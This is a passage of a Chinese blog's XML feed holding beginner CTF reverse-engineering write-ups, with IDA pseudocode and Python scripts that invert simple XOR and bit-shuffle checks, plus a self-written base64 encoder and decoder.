        <content type="html"><![CDATA[<p><a href="http://sus.njnet6.edu.cn/challenges#bitx" target="_blank" rel="noopener">题目地址</a></p><p>拖进ida，主函数一目了然，直接进入验证函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">for ( i = 0; *(_BYTE *)(i + a1) &amp;&amp; *(_BYTE *)(i + 0x804A040); ++i )</span><br><span class="line">&#123;</span><br><span class="line">  if ( *(_BYTE *)(i + a1) + 9 != ((unsigned __int8)((*(_BYTE *)(i + 0x804A040) &amp; 0xAA) &gt;&gt; 1) | (unsigned __int8)(2 * (*(_BYTE *)(i + 0x804A040) &amp; 0x55))) )</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">return 1;</span><br></pre></td></tr></table></figure><p>将输入与0x804a040处的值经过一系列运算后比较<br>若不相等则gg，直接写脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">final=[0x8F,0x0AA,0x85,0x0A0,0x48,0x0AC,0x40,0x95,0x0B6,0x16,0x0BE,0x40,0x0B4,0x16,0x97,0x0B1,0x0BE,0x0BC,0x16,0x0B1,0x0BC,0x16,0x9D,0x95,0x0BC,0x41,0x16,0x36,0x42,0x95,0x95,0x16,0x40,0x0B1,0x0BE,0x0B2,0x16,0x36,0x42,0x3D,0x3D,0x49]</span><br><span class="line">flag=final</span><br><span class="line">for i in range(len(final)):</span><br><span class="line">flag[i]=((final[i]&amp;0xaa)&gt;&gt;1|2*(final[i]&amp;0x55) )-9</span><br><span class="line">out=&apos;&apos;.join([chr(i) for i in flag])</span><br><span class="line">print out</span><br></pre></td></tr></table></figure><p><strong><em>flag get</em></strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>base64</title>
      <link href="/2018/09/22/base64/"/>
      <url>/2018/09/22/base64/</url>
      
        <content type="html"><![CDATA[<p>百度了一会base64，在吾爱破解上发现了一篇<a href="https://www.52pojie.cn/thread-793420-1-1.html" target="_blank" rel="noopener">讲解很详细的文章</a>，于是尝试自己实现base64加密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">letters=[&apos;A&apos;, &apos;B&apos;, &apos;C&apos;, &apos;D&apos;,&apos;E&apos;,&apos;F&apos;,&apos;G&apos;,&apos;H&apos;,&apos;I&apos;,&apos;J&apos;,&apos;K&apos;,&apos;L&apos;,&apos;M&apos;,&apos;N&apos;,&apos;O&apos;,&apos;P&apos;,&apos;Q&apos;,&apos;R&apos;,&apos;S&apos;,&apos;T&apos;,&apos;U&apos;,&apos;V&apos;,&apos;W&apos;,&apos;X&apos;,&apos;Y&apos;,&apos;Z&apos;,&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;,&apos;e&apos;,&apos;f&apos;,&apos;g&apos;,&apos;h&apos;,&apos;i&apos;,&apos;j&apos;,&apos;k&apos;,&apos;l&apos;,&apos;m&apos;,&apos;n&apos;,&apos;o&apos;,&apos;p&apos;,&apos;q&apos;,&apos;r&apos;,&apos;s&apos;,&apos;t&apos;,&apos;u&apos;,&apos;v&apos;,&apos;w&apos;,&apos;x&apos;,&apos;y&apos;,&apos;z&apos;,&apos;0&apos;, &apos;1&apos;, &apos;2&apos;, &apos;3&apos;,&apos;4&apos;,&apos;5&apos;,&apos;6&apos;,&apos;7&apos;,&apos;8&apos;,&apos;9&apos;,&apos;+&apos;, &apos;/&apos;]</span><br><span class="line">def encode(str_input):</span><br><span class="line">str_output=&apos;&apos;</span><br><span class="line">list_input=[&apos;&#123;:0&gt;8&#125;&apos;.format(str(bin(ord(str_input[i]))).replace(&apos;0b&apos;, &apos;&apos;)) for i in range(len(str_input))]</span><br><span class="line">compensate=0</span><br><span class="line">while list_input:</span><br><span class="line">list_temp=list_input[:3]</span><br><span class="line">while len(list_temp)%3:</span><br><span class="line">compensate+=1</span><br><span class="line">list_temp.append(&apos;0&apos;*8)</span><br><span class="line">str_temp=&apos;&apos;.join(list_temp)</span><br><span class="line">list_str_temp=[str_temp[i:i+6] for i in [0,6,12,18]]</span><br><span class="line">list_str_temp=[int(i,2) for i in list_str_temp]</span><br><span class="line">str_output+=&apos;&apos;.join(letters[i] for i in list_str_temp)</span><br><span class="line">list_input=list_input[3:]</span><br><span class="line">str_output+=&apos;=&apos;*compensate</span><br><span class="line">return str_output</span><br><span class="line">def decode(str_input):</span><br><span class="line">str_output=&apos;&apos;</span><br><span class="line">list_input=[&apos;&#123;:0&gt;6&#125;&apos;.format(str(bin(letters.index(i))).replace(&apos;0b&apos;, &apos;&apos;))for i in str_input if i != &apos;=&apos;]</span><br><span class="line">compensate=0</span><br><span class="line">for i in str_input:</span><br><span class="line">if i == &apos;=&apos;:</span><br><span class="line">compensate+=1</span><br><span class="line">while list_input:</span><br><span class="line">list_temp=list_input[:4]</span><br><span class="line">str_temp=&apos;&apos;.join(list_temp)</span><br><span class="line">while len(str_temp)%8:</span><br><span class="line">str_temp=str_temp[0:-1*2*compensate]</span><br><span class="line">list_str_temp=[str_temp[i:i+8] for i in [0,8,16]]</span><br><span class="line">list_str_temp=[int(i,2) for i in list_str_temp]</span><br><span class="line">str_output+=&apos;&apos;.join([chr(i)for i in list_str_temp])</span><br><span class="line">list_input=list_input[4:]</span><br><span class="line">return str_output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s=&quot;sadadsadaddasdadas&quot;</span><br><span class="line">d=&apos;c2FkYWRzYWRhZGRhc2RhZGFz&apos;</span><br><span class="line">print encode(s)</span><br><span class="line">print decode(d)</span><br></pre></td></tr></table></figure><p>运行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sH1rkEr:desktop macbook$ python base64.py</span><br><span class="line">c2FkYWRzYWRhZGRhc2RhZGFz</span><br><span class="line">sadadsadaddasdadas</span><br></pre></td></tr></table></figure><p>终于是成功了，编写过程中由于字符串和list的问题总是出错，还是要多看看python</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CGCTF-480小时精通c++</title>
      <link href="/2018/09/21/480%E5%B0%8F%E6%97%B6/"/>
      <url>/2018/09/21/480%E5%B0%8F%E6%97%B6/</url>
      
        <content type="html"><![CDATA[<p>听了大佬的话先来搭个blog，虽然啥也不会，但是可以对着教程慢慢搭，不管怎样能看见网页就行了先……</p><p>题目来自于cgctf平台，之前一直没做出来，光是名字就让我望而却步……</p><p>  ida启动！main函数伪代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  signed int i; // [rsp+Ch] [rbp-54h]</span><br><span class="line">  __int64 v5; // [rsp+10h] [rbp-50h]</span><br><span class="line">  __int64 v6; // [rsp+18h] [rbp-48h]</span><br><span class="line">  __int64 v7; // [rsp+20h] [rbp-40h]</span><br><span class="line">  __int64 v8; // [rsp+28h] [rbp-38h]</span><br><span class="line">  int v9; // [rsp+30h] [rbp-30h]</span><br><span class="line">  char v10; // [rsp+34h] [rbp-2Ch]</span><br><span class="line">  unsigned __int64 v11; // [rsp+58h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v11 = __readfsqword(0x28u);</span><br><span class="line">  v5 = 7652827924304847970LL;</span><br><span class="line">  v6 = 6588269719570178159LL;</span><br><span class="line">  v7 = 0615273543157435660505LL;</span><br><span class="line">  v8 = 4932672475662219355LL;</span><br><span class="line">  v9 = 2099869557;</span><br><span class="line">  v10 = 0;</span><br><span class="line">  std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;((__int64)&amp;std::cout, (__int64)&quot;The Encrypted Flag is: &quot;);</span><br><span class="line">  for ( i = 0; i &lt;= 35; ++i )</span><br><span class="line">    printf(&quot;%02x&quot;, *((unsigned __int8 *)&amp;v5 + i));</span><br><span class="line">  std::ostream::operator&lt;&lt;((__int64)&amp;std::cout, (__int64)std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很容易发现输出了加密后的flag，也就是v5-v9中的值，按r键转换成字符型，得加密flag:bdacsN4jo`q_g&lt;n[Eaw|3vWc[x1q{_tDuw)}</p><p>进入汇编界面发现输出”The Encrypted Flag is: “前被nop了一段，应该就是加密函数。</p><p>左侧函数列表中有480个名为_X1C_CG_EncryptFunction的函数，实现output[i]^=string[i%len(string)]^i，区别就是这480个函数中的string是从“001001001”到“480480480”。所以可以知道flag经过了这480个函数的加密后，就变成了bdacsN4jo`q_g&lt;n[Eaw|3vWc[x1q{_tDuw)}。</p><p>逆运算脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">key=[]</span><br><span class="line">for i in range(1,481):</span><br><span class="line">n=str(i)</span><br><span class="line">key.append(n.zfill(3)*3)</span><br><span class="line">final=&quot;bdacsN4jo`q_g&lt;n[Eaw|3vWc[x1q&#123;_tDuw)&#125;&quot;</span><br><span class="line">flag=final</span><br><span class="line">for i in range(479,-1,-1):</span><br><span class="line">a=key[i]</span><br><span class="line">for j in range(35,-1,-1):</span><br><span class="line">s=ord(flag[j])</span><br><span class="line">s^=ord(a[j%9])^j</span><br><span class="line">flag=flag.replace(flag[j],chr(s),1)</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><p><del>于是得到了flag</del></p><p>可能由于并不会替换字符串中特定下标处的值，所以并没有得到flag……向大佬求救尚未得到回复……</p><h2 id="两小时后"><a href="#两小时后" class="headerlink" title="两小时后"></a><strong><em>两小时后</em></strong></h2><p>原因没错，通过百度了一会python中字符串替换的问题，找到了正确的替换方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">key=[]</span><br><span class="line">for i in range(1,481):</span><br><span class="line">n=str(i)</span><br><span class="line">key.append(n.zfill(3)*3)</span><br><span class="line">final=&quot;bdacsN4jo`q_g&lt;n[Eaw|3vWc[x1q&#123;_tDuw)&#125;&quot;</span><br><span class="line">flag=final</span><br><span class="line">flag1=list(flag)</span><br><span class="line">for i in range(479,-1,-1):</span><br><span class="line">a=key[i]</span><br><span class="line">for j in range(36):</span><br><span class="line">s=ord(flag1[j])</span><br><span class="line">s^=ord(a[j%9])^j</span><br><span class="line">flag1[j]=chr(s)</span><br><span class="line">flag=&apos;&apos;.join(flag1)</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><p><strong>flag get！</strong></p><p>通过大佬的指点终于是完成了这一道简单题，明明知道了怎么去逆运算，结果因为python不会用的原因忙了这么久……要学的太多</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
